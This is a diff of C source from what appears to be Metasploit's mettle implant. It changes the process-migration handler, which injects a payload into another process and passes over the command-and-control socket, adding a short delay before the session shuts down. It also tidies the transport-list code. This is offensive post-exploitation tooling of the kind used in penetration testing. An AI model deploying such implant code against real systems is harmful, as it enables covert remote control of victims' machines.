@@ -20,6 +20,13 @@
 #include <unistd.h>
 #include <fcntl.h>
 
+
+static void migrate_break_cb(struct ev_loop *loop, ev_timer *w, int revents)
+{
+	free(w);
+	ev_break(loop, EVBREAK_ALL);
+}
+
 static struct tlv_packet *core_migrate(struct tlv_handler_ctx *ctx)
 {
 
@@ -29,7 +36,7 @@ static struct tlv_packet *core_migrate(struct tlv_handler_ctx *ctx)
 
 	struct mettle *m = ctx->arg;
 	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
-		
+
 #if defined(__x86_64__) || defined(__i386__)
 	if(migrate_support())
 	{
@@ -37,32 +44,42 @@ static struct tlv_packet *core_migrate(struct tlv_handler_ctx *ctx)
 		tlv_packet_get_u32(ctx->req, TLV_TYPE_MIGRATE_ARCH, &destination_arch);
 
 		char *payload = tlv_packet_get_raw(ctx->req, TLV_TYPE_MIGRATE_PAYLOAD, &payload_length);
-		
+
 		// payload cannot be NULL
 		if (!payload || payload_length == 0)
 			return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
-		      
+
 		const char *uuid = tlv_dispatcher_get_uuid(td,&uuid_length);
 
 		char *migrate_stub = tlv_packet_get_raw(ctx->req, TLV_TYPE_MIGRATE_STUB, &stub_length);
-		
+
 		// stub cannot be NULL
 		if (!migrate_stub || stub_length == 0)
 			return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
-		
+
 		struct c2 *c2 = mettle_get_c2(m);
 		struct c2_transport * transport = c2_get_current_transport(c2);
 		int fd = c2_transport_get_socket_fd(transport);
 
 		if(migrate(pid, migrate_stub, stub_length, payload, payload_length, uuid, fd))
 		{
-		      struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
-		      ev_break(mettle_get_loop(m), EVBREAK_ALL);
-		      return p;
+			struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
+
+			/*
+			 * The HTTP transport can take a while to detect the migrated session, so we need to wait here until it does. 2 seconds should be more than enough time for the transport to detect the new session and kill this one.
+			 */
+			ev_timer *break_timer = malloc(sizeof(ev_timer));
+			if (break_timer) {
+				ev_timer_init(break_timer, migrate_break_cb, 2.0, 0);
+				ev_timer_start(mettle_get_loop(m), break_timer);
+			} else {
+				ev_break(mettle_get_loop(m), EVBREAK_ALL);
+			}
+			return p;
 		}
 	}
 #endif
-		
+
 	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
 
 	return p;
@@ -281,12 +298,8 @@ static struct tlv_packet *core_transport_list(struct tlv_handler_ctx *ctx)
 	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
 	
 	do {
-		struct tlv_packet *packet_group = tlv_packet_new(TLV_TYPE_TRANS_GROUP, 0);
+		struct tlv_packet *packet_group = tlv_packet_new(TLV_TYPE_TRANS_GROUP, 0); 
 		packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_TRANS_URL, c2_transport_uri(current_transport));
-//		const char *ua = c2_transport_ua(current_transport);
-//		if (ua) {
-//			packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_TRANS_UA, ua);
-//		}
 
 		if (packet_group) {
 			p = tlv_packet_add_child(p, packet_group);
